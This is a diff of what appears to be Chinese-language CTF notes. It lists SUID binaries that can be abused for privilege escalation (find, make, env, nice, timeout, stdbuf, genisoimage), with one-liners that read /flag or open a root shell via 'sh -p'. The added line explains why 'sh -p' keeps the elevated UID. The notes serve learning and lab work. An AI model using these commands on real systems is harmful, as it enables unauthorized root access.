@@ -142,6 +142,7 @@ genisoimage： 创建ISO镜像文件 genisoimage -sort /flag
 env： 展示linux的环境变量，可以利用env命令的权限执行其他命令  env cat /flag
 find：可以通过find找到某文件后，执行某命令 find /flag -exec cat {} \;  或者 find /flag -exec sh -p \; 直接拿root
 make： 编译命令 make --eval='target: ; sh -p' target
+sh: 正常的sh命令，在执行时，会把euid设置为ruid，如果是sh -p选项的话，则会保留euid的实际值（+s的程序可以用它）
 nice： 更改程序优先级 nice cat /flag
 timeout：命令程序执行多长时间 timeout 1.0s cat /flag
 stdbuf： 重新设置stdin/stdout/stderr的缓冲方式(行缓冲、全缓冲、无缓冲)  stdbuf -iL cat /flag
